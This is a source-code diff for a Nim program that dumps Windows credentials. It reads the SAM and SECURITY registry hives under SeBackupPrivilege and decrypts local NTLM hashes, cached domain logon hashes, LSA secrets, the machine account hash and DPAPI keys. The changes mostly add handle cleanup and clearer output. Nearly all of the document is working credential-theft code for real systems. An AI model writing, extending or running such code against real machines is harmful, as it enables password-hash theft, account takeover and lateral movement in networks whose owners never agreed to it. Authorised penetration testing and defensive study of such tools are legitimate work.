@@ -1,5 +1,6 @@
 import Structs
 import Crypto
+import Utility
 import winim
 import std/strutils
 import std/sequtils
@@ -13,22 +14,15 @@ type
     RegQueryMultipleValuesWType = proc(hKey: HKEY, val_list: PVALENTW, num_vals: DWORD, lpValueBuf: LPWSTR, ldwTotsize: LPDWORD):LSTATUS {.stdcall.}
     NtEnumerateKeyType = proc (KeyHandle: HANDLE,Index: ULONG, KeyInformationClass: KEY_INFORMATION_CLASS, KeyInformation: PVOID,Length: ULONG,ResultLength: PULONG): NTSTATUS {.stdcall.}
     NtEnumerateValueKeyType = proc (KeyHandle: HANDLE,Index: ULONG,KeyValueInformationClass: KEY_VALUE_INFORMATION_CLASS,KeyValueInformation:PVOID,Length:ULONG,ResultLength:PULONG): NTSTATUS {.stdcall.}
+    NtCloseType = proc (KeyHandle: HANDLE): NTSTATUS {.stdcall.}
 var 
     NtOpenKeyExProc:NtOpenKeyExType= nil
     RegQueryMultipleValuesWProc:RegQueryMultipleValuesWType = nil
     NtQueryKeyProc:NtQueryKeyType = nil
     NtEnumerateKeyProc:NtEnumerateKeyType = nil
     NtEnumerateValueKeyProc:NtEnumerateValueKeyType = nil
+    NtCloseProc:NtCloseType = nil
 
-proc SeqToUnicode(input:seq[byte]):string = 
-  var index:int= 0
-  var returnValue = newWString(0)
-  var returnValueStr = ""
-  while index <  input.len:
-    returnValue.add(cast[WCHAR](input[index]))
-    index=index+2
-  returnValueStr = $returnValue
-  return returnValueStr
 
 proc OpenRegistryWithNtOpenKeyEx(keyString: PCWSTR): HANDLE =
   var 
@@ -43,7 +37,7 @@ proc OpenRegistryWithNtOpenKeyEx(keyString: PCWSTR): HANDLE =
   ntStatus = NtOpenKeyExProc(addr returnHandle,KEY_READ,addr objectAttributes, openOptions)
   if(ntStatus != 0):
     echo "[-] Error on openning key for ",keyString," : ",GetLastError()
-    return -1
+    quit(-1)
   return returnHandle
 
 proc EnumerateValueNames(hKey:HANDLE):seq[string] = 
@@ -95,7 +89,7 @@ proc GetValueWithRegQueryMultipleValuesWType(keyHandle: HANDLE,valueString: stri
   
   if returnValue != ERROR_MORE_DATA or bufferSize == 0:
     echo "[-] Error on reading buffer size for ",valueString," : ",GetLastError()
-    return @[]
+    quit(-1)
     
   buffer = newSeq[byte](bufferSize)
 
@@ -103,7 +97,7 @@ proc GetValueWithRegQueryMultipleValuesWType(keyHandle: HANDLE,valueString: stri
   
   if returnValue != 0:
       echo "[-] Error on getting value for ",valueString," : ",GetLastError()
-      return @[]
+      quit(-1)
   
   if values[0].ve_valuelen > 0:
     let offset = values[0].ve_valueptr.int - cast[int](addr buffer[0])
@@ -138,11 +132,16 @@ proc DynamicallyLoadFunctions():bool =
   if(ntEnumerateValueKeyAddr == cast[FARPROC](0)):
     echo "[-] Error on Dynamically Loading functions for NtEnumerateValueKey"
     return false
+  let ntCloseAddr = GetProcAddress(ntdllHandle, "NtClose")
+  if(ntCloseAddr == cast[FARPROC](0)):
+    echo "[-] Error on Dynamically Loading functions for NtClose"
+    return false
   NtOpenKeyExProc = cast[NtOpenKeyExType](ntOpenKeyExAddr)
   RegQueryMultipleValuesWProc = cast[RegQueryMultipleValuesWType](regQueryMultipleValuesWAddr)
   NtQueryKeyProc = cast[NtQueryKeyType](ntQueryKeyAddr)
   NtEnumerateKeyProc = cast[NtEnumerateKeyType](ntEnumerateKeyAddr)
   NtEnumerateValueKeyProc = cast[NtEnumerateValueKeyType](ntEnumerateValueKeyAddr)
+  NtCloseProc = cast[NtCloseType](ntCloseAddr)
   return true
 
 
@@ -174,14 +173,6 @@ proc SetPrivilege(lpszPrivilege: LPCSTR): bool =
 
   return true
 
-proc hexStringToByteArray(s: string): seq[byte] =
-  var i = 0
-  result = newSeq[byte](0)
-  while i < s.len:
-    result.add(parseHexInt(s[i .. i+1]).byte)
-    i += 2
-  return result
-
 proc GetBootKey(): seq[byte] = 
   var 
     keyValue:string
@@ -205,12 +196,13 @@ proc GetBootKey(): seq[byte] =
     returnValue = NtQueryKeyProc(regHandle, KeyNodeInformation, NULL, 0, addr bufferSize)
     if bufferSize == 0:
       echo "[-] Error on reading buffer size for ",keyValue," : ",GetLastError()
-      return @[]
+      quit(-1)
     buffer = newSeq[byte](bufferSize)
     returnValue = NtQueryKeyProc(regHandle, KeyNodeInformation, cast[PVOID](addr buffer[0]), bufferSize, addr bufferSize)
+    discard NtCloseProc(regHandle)
     if returnValue != 0:
       echo "[-] Error on getting value for ",keyValue," : ",GetLastError()
-      return @[]
+      quit(-1)
     keyClassInfoPtr = cast[PKEY_NODE_INFORMATION](addr buffer[0])
     if keyClassInfoPtr.ClassLength > 0:
       pClass = cast[ptr UncheckedArray[WCHAR]]( cast[uint64](addr buffer[0]) + cast[uint64](keyClassInfoPtr.ClassOffset))
@@ -225,6 +217,7 @@ proc GetBootKey(): seq[byte] =
 proc GetSysKey(): seq[byte] = 
   var handleVal = OpenRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SAM\\SAM\\Domains\\Account")
   var returnByte = GetValueWithRegQueryMultipleValuesWType(handleVal,"F")
+  discard NtCloseProc(handleVal)
   return returnByte
 
 
@@ -269,7 +262,7 @@ proc GetHashedBootKey(fVal:seq[byte],bootKey:seq[byte]):seq[byte] =
     return decText
   else:
     echo "[-] Error parsing hashed bootkey"
-    return @[]
+    quit(-1)
 
 proc DumpSecret(keyLocation:string,decryptedLsaKey:seq[byte]):seq[byte] = 
   var 
@@ -292,6 +285,7 @@ proc DumpSecret(keyLocation:string,decryptedLsaKey:seq[byte]):seq[byte] =
   dctx.decrypt(valueDataVal2, returnValue)
   # Clear context of ECB[aes256]
   dctx.clear()
+  discard NtCloseProc(hKey)
   return returnValue
 
 proc GetServiceUsername(targetService: string): string =
@@ -323,26 +317,23 @@ proc PrintLSASecret(keyName:string,secretBlob:LsaSecretBlob) =
     let computerNameArr = GetValueWithRegQueryMultipleValuesWType(hKey,"Hostname")
     var computerName = SeqToUnicode(computerNameArr).replace("\0", "")
     let computerAcctHash = Md4Hash2(secretBlob.Secret).mapIt(it.toHex(2)).join("-").replace("-","").toLower()
+    discard NtCloseProc(hKey)
     echo "[*] Machine Account: " & domainName & "\\" & computerName & "$:aad3b435b51404eeaad3b435b51404ee:" & computerAcctHash
   elif(keyName.toUpper().startsWith("DPAPI")):
     let machineStr = secretBlob.Secret[4..<4+20].mapIt(it.toHex(2)).join("-")
     let userStr = secretBlob.Secret[24..<24+20].mapIt(it.toHex(2)).join("-")
-    echo "[*] DPAPI Keys: dpapi_machinekey: " & machineStr.replace("-","").toLower() & " dpapi_userkey: " & userStr.replace("-","").toLower()
+    echo "[*] DPAPI Keys: dpapi_machinekey: " & machineStr.replace("-","").toLower() & " & dpapi_userkey: " & userStr.replace("-","").toLower()
   elif(keyName.toUpper().startsWith("NL$KM")):
     echo "[*] NL$KM: " & secretBlob.Secret.mapIt(it.toHex(2)).join("-").replace("-","").toLower()
   elif(keyName.toUpper().startsWith("ASPNET_WP_PASSWORD")):
     echo "[*] ASPNET: " & $secretBlob.SecretString
   else:
-    echo "[*] Secret Type not supported: " & secretBlob.Secret.mapIt(it.toHex(2)).join("-").replace("-","").toLower()
+    echo "[*] Secret Type not supported: " & keyName & " - " & secretBlob.Secret.mapIt(it.toHex(2)).join("-").replace("-","").toLower()
 
 proc GetSecurityDump() = 
   var
     hKey = OpenRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SECURITY\\Policy\\PolEKList")
     fVal = GetValueWithRegQueryMultipleValuesWType(hKey,"")
-    version = fVal[0..<4]
-    enc_key_id = fVal[4..<4+16]
-    enc_algo = fVal[20..<4+20]
-    flags = fVal[24..<4+24]
     data = fVal[28..<fVal.len]
     dataVal = data[0..<32]
     bootKey = GetBootKey()
@@ -352,9 +343,6 @@ proc GetSecurityDump() =
     dctx: ECB[aes256]
     nlkmKey:seq[byte]
     currValName:string = ""
-    value:seq[byte]
-    valueData:seq[byte]
-    valueDataVal2:seq[byte]
     index: ULONG = 0
     buf:seq[byte]
     status: NTSTATUS
@@ -374,8 +362,6 @@ proc GetSecurityDump() =
     startIndex:int
     sliceUsername:seq[byte]
     sliceDomain:seq[byte]
-    usernamePtr:ptr WCHAR
-    domainPtr:ptr WCHAR
     listOfLSASecrets:seq[string]
     secretBlob:LsaSecretBlob
 
@@ -386,6 +372,7 @@ proc GetSecurityDump() =
   # Clear context of ECB[aes256]
   dctx.clear()
   decryptedLsaKey = decryptedLsaKey[68..<68+32]
+  discard NtCloseProc(hKey)
   hKey = OpenRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SECURITY\\Policy\\Secrets\\NL$KM")
   while true:
     bufSize = 0
@@ -413,7 +400,8 @@ proc GetSecurityDump() =
     inc index
   if(currValName == ""):
     echo "[-] NLKM Key not found"
-    return
+    quit(-1)
+  discard NtCloseProc(hKey)
   nlkmKey = DumpSecret("\\Registry\\Machine\\SECURITY\\Policy\\Secrets\\NL$KM\\"&currValName,decryptedLsaKey)
   hKey = OpenRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SECURITY\\Cache")
   cachedDomainLogonKeyNames=EnumerateValueNames(hKey)
@@ -430,7 +418,8 @@ proc GetSecurityDump() =
       domain = SeqToUnicode(sliceDomain)
       username = SeqToUnicode(sliceUsername)
       domain = domain.replace("\0", "")
-      echo domain & "/" & username & ":$DCC2$10240#" & username & "#" & hashedPW.mapIt(it.toHex(2)).join("-").replace("-","").toLower()
+      echo "[*] Cached Credential: " & domain & "/" & username & ":$DCC2$10240#" & username & "#" & hashedPW.mapIt(it.toHex(2)).join("-").replace("-","").toLower()
+  discard NtCloseProc(hKey)
   hKey = OpenRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SECURITY\\Policy\\Secrets")
   index = 0
   while true:
@@ -456,6 +445,7 @@ proc GetSecurityDump() =
       if(cmpIgnoreCase(name,"NL$Control") != 0):
         listOfLSASecrets.add(name)
     inc index
+  discard NtCloseProc(hKey)
   for lsaSecretString in listOfLSASecrets:
     if(cmpIgnoreCase(lsaSecretString,"NL$KM") == 0):
       secretBlob = NewLsaSecretBlob(nlkmKey)
@@ -538,6 +528,7 @@ proc GetSAMDump() =
       if(name.startsWith("00000")):
         listOfUserKeys.add(name)
     inc index
+  discard NtCloseProc(hKey)
   for userKey in listOfUserKeys:
     lmHash = "aad3b435b51404eeaad3b435b51404ee";
     ntHash = "31d6cfe0d16ae931b73c59d7e0c089c0";
@@ -545,6 +536,7 @@ proc GetSAMDump() =
     copyMem(addr userRIDByteArray[0],cast[ptr byte](addr userRIDUint),4) 
     hKey = OpenRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users\\" & userKey)
     vValueUser = GetValueWithRegQueryMultipleValuesWType(hKey,"V")
+    discard NtCloseProc(hKey)
     offset = (cast[ptr int32](addr vValueUser[12]))[]
     offset+=204
     length = (cast[ptr int32](addr vValueUser[16]))[]
@@ -566,7 +558,6 @@ proc GetSAMDump() =
       lmKeyParts.add(hashedBootKey[0..<16])
       lmKeyParts.add(userRIDByteArray)
       lmKeyParts.add(almpassword)
-      
       md5ContextVar.md5Init()
       md5ContextVar.md5Update(lmKeyParts)
       md5ContextVar.md5Final(md5DigestVar)
@@ -605,7 +596,7 @@ proc GetSAMDump() =
         ntHash = DecryptSingleHash(desEncryptedHash, userKey).replace("-", "");
     ridStr = $userRIDUint
     hashes = lmHash.toLower() & ":" & ntHash.toLower()
-    echo $usernameWstring & "-" & ridStr & "-" & hashes
+    echo "[*] Local User RID: " & ridStr & " - " & $usernameWstring & " - " & hashes
 
 proc main() =
   if(not DynamicallyLoadFunctions()):
@@ -614,23 +605,12 @@ proc main() =
   if(not SetPrivilege("SeBackupPrivilege")):
     echo "[-] Cannot enable SeBackupPrivilege."
     quit(-1)  
- 
-  # var desTest = deObfuscateHashPart(@[byte 0x54,0x07,0x5b,0x73,0x7d,0x2b,0x35,0x2e],@[byte 0xf8,0x0,0x40,0x0,0xe,0xc0,0x04,0x00])
-  #var bootKeySeq = GetBootKey()
-  #var sysKeySeq = GetSysKey()
+  echo "[!] Trying to parse SAM Related Credentials (Local Users)"
+  echo ""
   GetSAMDump()
+  echo ""
+  echo "[!] Trying to parse Security Related Credentials (Cached Domain Logon Info, Machine Account and LSA Secrets)"
   GetSecurityDump()
-  echo "done"
-  #[
-  var wstring = newWString(0)
-  var index:int = 0
-  while returnByte[index] != 0x0:
-            wstring.add(cast[WCHAR](returnByte[index]))
-            index=index+2
-  echo wstring  # Output: Hello
-  ]#
-  
-  
   
 when isMainModule:
   main()
